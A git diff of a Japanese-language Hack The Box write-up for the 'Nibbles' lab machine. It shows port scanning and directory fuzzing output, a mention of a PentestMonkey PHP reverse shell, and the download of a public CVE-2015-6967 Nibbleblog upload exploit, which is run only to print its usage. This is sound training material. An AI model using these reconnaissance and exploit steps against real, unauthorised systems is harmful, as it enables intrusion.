@@ -1,19 +1,7 @@
 https://app.hackthebox.com/machines/Nibbles
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.96.84 --scripts none
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-Scanning ports like it's my full-time job. Wait, it is.
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+└─$ rustscan -a 10.129.96.84 --no-banner --scripts none
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.96.84:22
@@ -49,7 +37,38 @@ nibbledblogにアクセス
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_02.png">  
 大した情報はなさそうなので、ディレクトリを探索
 ```sh
-└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.96.84/nibbleblog/FUZZ
+└─$ ffuf -c -w  /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.96.84/nibbleblog/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.155.211/nibbleblog/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 472ms]
+content                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 248ms]
+plugins                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 2268ms]
+themes                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 2268ms]
+languages               [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 412ms]
+README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 255ms]
+:: Progress: [29999/29999] :: Job [1/1] :: 141 req/sec :: Duration: [0:03:26] :: Errors: 1 ::
+
+
+└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.129.96.84/nibbleblog/FUZZ
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -63,7 +82,7 @@ ________________________________________________
 
  :: Method           : GET
  :: URL              : http://10.129.96.84/nibbleblog/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
@@ -71,19 +90,28 @@ ________________________________________________
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 306ms]
-.htaccess               [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 290ms]
-.hta                    [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 303ms]
-admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 302ms]
-admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 318ms]
-.htpasswd               [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 2702ms]
-content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 300ms]
-index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 307ms]
-languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 317ms]
-plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 300ms]
-README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 308ms]
-themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 306ms]
-:: Progress: [4614/4614] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
+install.php             [Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 511ms]
+LICENSE.txt             [Status: 200, Size: 35148, Words: 5836, Lines: 676, Duration: 293ms]
+update.php              [Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 512ms]
+index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 535ms]
+admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 496ms]
+.htaccess               [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 269ms]
+feed.php                [Status: 200, Size: 306, Words: 8, Lines: 8, Duration: 395ms]
+sitemap.php             [Status: 200, Size: 404, Words: 33, Lines: 11, Duration: 297ms]
+.                       [Status: 200, Size: 2989, Words: 116, Lines: 61, Duration: 303ms]
+.html                   [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 293ms]
+.php                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 320ms]
+.htpasswd               [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 283ms]
+.htm                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 283ms]
+.htpasswds              [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 327ms]
+.htgroup                [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 256ms]
+COPYRIGHT.txt           [Status: 200, Size: 1272, Words: 168, Lines: 27, Duration: 250ms]
+wp-forum.phps           [Status: 403, Size: 313, Words: 22, Lines: 12, Duration: 341ms]
+.htaccess.bak           [Status: 403, Size: 313, Words: 22, Lines: 12, Duration: 346ms]
+.htuser                 [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 247ms]
+.ht                     [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 247ms]
+.htc                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 248ms]
+:: Progress: [17129/17129] :: Job [1/1] :: 136 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
 ```
 admin.phpにアクセスすると、クレデンシャルが必要だった  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_03.png">  
@@ -100,16 +128,7 @@ PoCがあるのでダウンロードし実行
 PHPは[Reverse Shell Generator](https://www.revshells.com/)のPentestMonkeyを使用
 ```sh
 └─$ wget https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
---2025-04-26 07:00:50--  https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1932 (1.9K) [text/plain]
-Saving to: ‘exploit.py’
-
-exploit.py                                                 100%[========================================================================================================================================>]   1.89K  --.-KB/s    in 0s      
-
-2025-04-26 07:00:51 (52.1 MB/s) - ‘exploit.py’ saved [1932/1932]
+2025-04-26 07:00:51 URL:https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py [1932/1932] -> "exploit.py" [1]
 
 └─$ python3.13 exploit.py
 usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
